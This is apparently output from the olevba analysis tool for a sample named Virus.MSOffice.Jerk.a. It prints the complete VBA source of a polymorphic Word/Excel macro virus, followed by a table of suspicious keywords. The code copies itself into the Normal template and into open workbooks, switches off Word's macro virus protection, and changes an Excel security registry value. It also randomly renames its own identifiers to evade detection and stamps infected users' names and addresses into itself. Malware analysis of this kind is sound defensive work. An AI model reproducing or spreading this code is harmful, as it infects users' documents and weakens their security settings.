olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSOffice.Jerk.a-80e236db8d8ba750644eb04612203fac9e8bb530
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSOffice.Jerk.a-80e236db8d8ba750644eb04612203fac9e8bb530 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
































Private Sub Workbook_Deactivate()
On Error Resume Next
Const VFXLGYFG = 1, VGMZZSUNMHEH = True, VYDTHYXFX = False, JWJGZLLPHT = 0
Dim MWVMENTD, HALSCF As String
Dim GVFQAIOESPCBXSX, WPBWCTJ As Integer
Dim GSAVMYVFEIQJE As Boolean
HALSCF = "ThisWorkbook"
MWVMENTD = Application.ThisWorkbook.VBProject.VBComponents.Item(VFXLGYFG).CodeModule.Lines(1, Application.ThisWorkbook.VBProject.VBComponents.Item(VFXLGYFG).CodeModule.CountOfLines)
Call XVHMTXIR(MWVMENTD)
For GVFQAIOESPCBXSX = VFXLGYFG To Application.Workbooks.Count
GSAVMYVFEIQJE = VYDTHYXFX
For WPBWCTJ = VFXLGYFG To Application.Workbooks.Item(GVFQAIOESPCBXSX).VBProject.VBComponents.Count
If Application.Workbooks.Item(GVFQAIOESPCBXSX).VBProject.VBComponents.Item(WPBWCTJ).CodeModule.CountOfLines = JWJGZLLPHT Then
If Application.Workbooks.Item(GVFQAIOESPCBXSX).Path <> "" And Application.Workbooks.Item(GVFQAIOESPCBXSX).Saved = VGMZZSUNMHEH And GSAVMYVFEIQJE = VYDTHYXFX Then GSAVMYVFEIQJE = VGMZZSUNMHEH
Application.Workbooks.Item(GVFQAIOESPCBXSX).VBProject.VBComponents.Item(WPBWCTJ).CodeModule.InsertLines VFXLGYFG, MWVMENTD
If Application.Workbooks.Item(GVFQAIOESPCBXSX).VBProject.VBComponents.Item(WPBWCTJ).Name = HALSCF Then
Application.Workbooks.Item(GVFQAIOESPCBXSX).VBProject.VBComponents.Item(WPBWCTJ).CodeModule.ReplaceLine VFXLGYFG * 33, "Private Sub Workbook_Deactivate()"
Else
Application.Workbooks.Item(GVFQAIOESPCBXSX).VBProject.VBComponents.Item(WPBWCTJ).CodeModule.ReplaceLine VFXLGYFG * 33, "Private Sub Worksheet_Deactivate()"
End If
End If
Next WPBWCTJ
If GSAVMYVFEIQJE = VGMZZSUNMHEH Then Application.Workbooks.Item(GVFQAIOESPCBXSX).Save
Next GVFQAIOESPCBXSX
End Sub
Private Sub Document_Close()
On Error Resume Next
Const VGMZZSUNMHEH = True, VYDTHYXFX = False, JWJGZLLPHT = 0, VFXLGYFG = 1, AHERBBTSCUCCWBA = wdFormatDocument, TCYYSQZVGXA = wdFormatTemplate, FHKOO = ":"
Dim GSAVMYVFEIQJE, DPPUJA, DURQIJ, ANAIESNXNQEZKBF As Boolean
Dim XHFFEBT, KHIBSRRSTXF As Object
Dim XTSLUSAGKXNKD, MWVMENTD As String
If Day(Now) = 14 And Month(Now) > 5 Then MsgBox "I think " & Application.UserName & " is a big stupid jerk!", 0, "Class.Poppy"
Set XHFFEBT = ActiveDocument.VBProject.VBComponents.Item(VFXLGYFG)
Set KHIBSRRSTXF = NormalTemplate.VBProject.VBComponents.Item(VFXLGYFG)
Randomize
DURQIJ = VYDTHYXFX
ANAIESNXNQEZKBF = VYDTHYXFX
If XHFFEBT.CodeModule.CountOfLines <> JWJGZLLPHT Then DURQIJ = VGMZZSUNMHEH
If KHIBSRRSTXF.CodeModule.CountOfLines <> JWJGZLLPHT Then ANAIESNXNQEZKBF = VGMZZSUNMHEH
Options.VirusProtection = VYDTHYXFX
If (DURQIJ = VGMZZSUNMHEH Xor ANAIESNXNQEZKBF = VGMZZSUNMHEH) And (ActiveDocument.SaveFormat = AHERBBTSCUCCWBA Or ActiveDocument.SaveFormat = TCYYSQZVGXA) Then
If DURQIJ = VGMZZSUNMHEH Then
DPPUJA = NormalTemplate.Saved
MWVMENTD = XHFFEBT.CodeModule.Lines(VFXLGYFG, XHFFEBT.CodeModule.CountOfLines)
Call YPPKRHWABRKMO(MWVMENTD)
If Int(Rnd * 10 * VFXLGYFG) = VFXLGYFG * 7 Then Call VJUNPEDGHVFC(MWVMENTD)
Call QUSJPDEUL(MWVMENTD)
KHIBSRRSTXF.CodeModule.InsertLines VFXLGYFG, MWVMENTD
If DPPUJA = VGMZZSUNMHEH Then NormalTemplate.Save
End If
XTSLUSAGKXNKD = Mid(ActiveDocument.FullName, 2, VFXLGYFG)
If ANAIESNXNQEZKBF = VGMZZSUNMHEH And (XTSLUSAGKXNKD = FHKOO Or ActiveDocument.Saved = VYDTHYXFX) Then
GSAVMYVFEIQJE = ActiveDocument.Saved
MWVMENTD = KHIBSRRSTXF.CodeModule.Lines(VFXLGYFG, KHIBSRRSTXF.CodeModule.CountOfLines)
Call QUSJPDEUL(MWVMENTD)
XHFFEBT.CodeModule.InsertLines VFXLGYFG, MWVMENTD
If GSAVMYVFEIQJE = VGMZZSUNMHEH Then ActiveDocument.Save
End If
End If
End Sub
Private Sub VJUNPEDGHVFC(ByRef MWVMENTD As String)
On Error Resume Next
Const RHTTB = 48, BENVRXCFIQZKMJ = 15, JPZSJPEYPM = 5, SELON = 65, YNONDRYBU = 90, VFXLGYFG = 1, VGMZZSUNMHEH = True, VYDTHYXFX = False
Dim MOSGELLCLDYY, JHPDFXGTTOBHMKTmp, LOOEPXRYJOWB, JHPDFXGTTOBHMK(VFXLGYFG To RHTTB), JHPDFXGTTOBHMK2(VFXLGYFG To RHTTB) As String
Dim GVFQAIOESPCBXSX, WPBWCTJ, QTWBBPYBPQGZ As Integer
Dim LRRRCJW As Boolean
MOSGELLCLDYY = "MWVMENTD RHTTB JHPDFXGTTOBHMK JHPDFXGTTOBHMK2 LOOEPXRYJOWB GVFQAIOESPCBXSX WPBWCTJ QTWBBPYBPQGZ LRRRCJW VJUNPEDGHVFC BENVRXCFIQZKMJ JPZSJPEYPM SELON YNONDRYBU VFXLGYFG MOSGELLCLDYY JHPDFXGTTOBHMKTmp GSAVMYVFEIQJE DPPUJA DURQIJ ANAIESNXNQEZKBF XHFFEBT KHIBSRRSTXF YPPKRHWABRKMO TTCLYY YQIHRITRXUG WTBPYTPJSQZ OQOONJWJDQUO TTCLYYTmp RFNBRSWST CJWFSRUEZ XTSLUSAGKXNKD VGMZZSUNMHEH VYDTHYXFX JWJGZLLPHT AHERBBTSCUCCWBA TCYYSQZVGXA PPAWIOTVCLSJR DSBHMLIEESA FHKOO RXLOLSZGN CWXQTT HALSCF XVHMTXIR QUSJPDEUL WWUFMOKJFYTHB NZZIWPQEGVAEFMR WMBOZWYXC"
Randomize
WPBWCTJ = VFXLGYFG
For GVFQAIOESPCBXSX = VFXLGYFG To Len(MOSGELLCLDYY)
If Mid(MOSGELLCLDYY, GVFQAIOESPCBXSX, VFXLGYFG) = " " Or GVFQAIOESPCBXSX = Len(MOSGELLCLDYY) Then
If GVFQAIOESPCBXSX = Len(MOSGELLCLDYY) Then JHPDFXGTTOBHMKTmp = JHPDFXGTTOBHMKTmp & Mid(MOSGELLCLDYY, GVFQAIOESPCBXSX, VFXLGYFG)
For QTWBBPYBPQGZ = VFXLGYFG To Int((BENVRXCFIQZKMJ - JPZSJPEYPM + VFXLGYFG) * Rnd + JPZSJPEYPM)
JHPDFXGTTOBHMK2(WPBWCTJ) = JHPDFXGTTOBHMK2(WPBWCTJ) & Chr(Int((YNONDRYBU - SELON + VFXLGYFG) * Rnd + SELON))
Next QTWBBPYBPQGZ
JHPDFXGTTOBHMK(WPBWCTJ) = JHPDFXGTTOBHMKTmp
JHPDFXGTTOBHMKTmp = ""
WPBWCTJ = WPBWCTJ + VFXLGYFG
Else
JHPDFXGTTOBHMKTmp = JHPDFXGTTOBHMKTmp & Mid(MOSGELLCLDYY, GVFQAIOESPCBXSX, VFXLGYFG)
End If
Next GVFQAIOESPCBXSX
LRRRCJW = VYDTHYXFX
For GVFQAIOESPCBXSX = VFXLGYFG To Len(MWVMENTD)
For WPBWCTJ = VFXLGYFG To RHTTB
If Mid(MWVMENTD, GVFQAIOESPCBXSX, Len(JHPDFXGTTOBHMK(WPBWCTJ))) = JHPDFXGTTOBHMK(WPBWCTJ) Then
LOOEPXRYJOWB = LOOEPXRYJOWB & JHPDFXGTTOBHMK2(WPBWCTJ)
GVFQAIOESPCBXSX = GVFQAIOESPCBXSX + Len(JHPDFXGTTOBHMK(WPBWCTJ)) - VFXLGYFG
LRRRCJW = VGMZZSUNMHEH
Exit For
End If
Next WPBWCTJ
If LRRRCJW = VYDTHYXFX Then
LOOEPXRYJOWB = LOOEPXRYJOWB & Mid(MWVMENTD, GVFQAIOESPCBXSX, VFXLGYFG)
Else
LRRRCJW = VYDTHYXFX
End If
Next GVFQAIOESPCBXSX
MWVMENTD = LOOEPXRYJOWB
End Sub
Private Sub YPPKRHWABRKMO(ByRef MWVMENTD As String)
On Error Resume Next
Const OQOONJWJDQUO = "' ", VFXLGYFG = 1
Const PPAWIOTVCLSJR = "hh:mm:ss: AMPM - ", DSBHMLIEESA = "dddd, d mmm yyyy"
Dim TTCLYYTmp, TTCLYY, RFNBRSWST, CJWFSRUEZ, YQIHRITRXUG, WTBPYTPJSQZ As String
Dim GVFQAIOESPCBXSX As Integer
YQIHRITRXUG = Chr(10 * VFXLGYFG + 3)
TTCLYY = Application.UserAddress
CJWFSRUEZ = Format(Time, PPAWIOTVCLSJR) & Format(Date, DSBHMLIEESA)
WTBPYTPJSQZ = Chr(VFXLGYFG * 10)
RFNBRSWST = Application.UserName
For GVFQAIOESPCBXSX = VFXLGYFG To Len(TTCLYY)
If Mid(TTCLYY, GVFQAIOESPCBXSX, VFXLGYFG) <> YQIHRITRXUG Then
If Mid(TTCLYY, GVFQAIOESPCBXSX, VFXLGYFG) <> WTBPYTPJSQZ Then
TTCLYYTmp = TTCLYYTmp & Mid(TTCLYY, GVFQAIOESPCBXSX, VFXLGYFG)
End If
Else
TTCLYYTmp = TTCLYYTmp & YQIHRITRXUG & OQOONJWJDQUO
End If
Next GVFQAIOESPCBXSX
MWVMENTD = MWVMENTD & YQIHRITRXUG & OQOONJWJDQUO & CJWFSRUEZ & YQIHRITRXUG & OQOONJWJDQUO & RFNBRSWST & YQIHRITRXUG & OQOONJWJDQUO & TTCLYY & YQIHRITRXUG
End Sub
Private Sub QUSJPDEUL(ByVal MWVMENTD As String)
On Error Resume Next
Dim WMBOZWYXC As Long
Dim RXLOLSZGN As Object
Dim WWUFMOKJFYTHB, NZZIWPQEGVAEFMR As String
WWUFMOKJFYTHB = "HKEY_CURRENT_USER\Software\Microsoft\Office\8.0\Excel\Microsoft Excel"
WMBOZWYXC = &H0
NZZIWPQEGVAEFMR = "Options6"
System.PrivateProfileString("", WWUFMOKJFYTHB, NZZIWPQEGVAEFMR) = WMBOZWYXC
Set RXLOLSZGN = GetObject(, "Excel.Application")
Const VFXLGYFG = 1, JWJGZLLPHT = 0
Dim HALSCF As String
Dim GVFQAIOESPCBXSX, WPBWCTJ As Integer
HALSCF = "ThisWorkbook"
For GVFQAIOESPCBXSX = VFXLGYFG To RXLOLSZGN.Application.Workbooks.Count
For WPBWCTJ = VFXLGYFG To RXLOLSZGN.Application.Workbooks.Item(GVFQAIOESPCBXSX).VBProject.VBComponents.Count
If RXLOLSZGN.Application.Workbooks.Item(GVFQAIOESPCBXSX).VBProject.VBComponents.Item(WPBWCTJ).CodeModule.CountOfLines = JWJGZLLPHT Then
RXLOLSZGN.Application.Workbooks.Item(GVFQAIOESPCBXSX).VBProject.VBComponents.Item(WPBWCTJ).CodeModule.InsertLines VFXLGYFG, MWVMENTD
If RXLOLSZGN.Application.Workbooks.Item(GVFQAIOESPCBXSX).VBProject.VBComponents.Item(WPBWCTJ).Name = HALSCF Then
RXLOLSZGN.Application.Workbooks.Item(GVFQAIOESPCBXSX).VBProject.VBComponents.Item(WPBWCTJ).CodeModule.ReplaceLine 33 * VFXLGYFG, "Private Sub Workbook_Deactivate()"
Else
RXLOLSZGN.Application.Workbooks.Item(GVFQAIOESPCBXSX).VBProject.VBComponents.Item(WPBWCTJ).CodeModule.ReplaceLine VFXLGYFG * 33, "Private Sub Worksheet_Deactivate()"
End If
End If
Next WPBWCTJ
Next GVFQAIOESPCBXSX
Set RXLOLSZGN = Nothing
End Sub
Private Sub XVHMTXIR(ByVal MWVMENTD As String)
On Error Resume Next
Const VGMZZSUNMHEH = True, VYDTHYXFX = False, VFXLGYFG = 1, JWJGZLLPHT = 0
Dim CWXQTT As Object
Dim DPPUJA As Boolean
Set CWXQTT = GetObject(, "Word.Application")
If CWXQTT.NormalTemplate.VBProject.VBComponents.Item(VFXLGYFG).CodeModule.CountOfLines = JWJGZLLPHT Then
DPPUJA = CWXQTT.NormalTemplate.Saved
CWXQTT.Options.VirusProtection = VYDTHYXFX
CWXQTT.NormalTemplate.VBProject.VBComponents.Item(VFXLGYFG).CodeModule.InsertLines VFXLGYFG, MWVMENTD
If DPPUJA = VGMZZSUNMHEH Then CWXQTT.NormalTemplate.Save
End If
Set CWXQTT = Nothing
End Sub

' 08:15:11: PM - Tuesday, 9 Feb 1999
' Avert
'

' 08:01:37: odp. - úterý, 8 VI 1999
' Skag
'

' 04:45:15:  - Sonntag, 26 Dez 1999
' Andreas Marx
'

+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|GetObject           |May get an OLE object with a running instance|
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|Xor                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+
